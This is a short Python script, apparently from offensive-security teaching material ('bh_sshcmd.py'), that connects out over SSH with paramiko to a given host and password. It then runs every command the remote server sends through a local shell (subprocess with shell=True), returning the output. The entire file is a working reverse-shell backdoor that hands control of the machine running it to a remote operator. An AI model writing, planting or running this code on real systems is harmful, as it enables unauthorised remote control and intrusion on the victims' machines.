import sys
import subprocess
import paramiko


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd, look_for_keys=False, allow_agent=False)
    
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024).decode()
            if command == 'exit':
                print("Exiting SSH session.")
                client.close()
                break
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e).encode())


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python bh_sshcmd.py <ip> <username> <password> [port]")
        sys.exit(1)

    server_ip = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    port = int(sys.argv[4]) if len(sys.argv) > 4 else 22

    ssh_command(server_ip, port, username, password, "Client connected!")
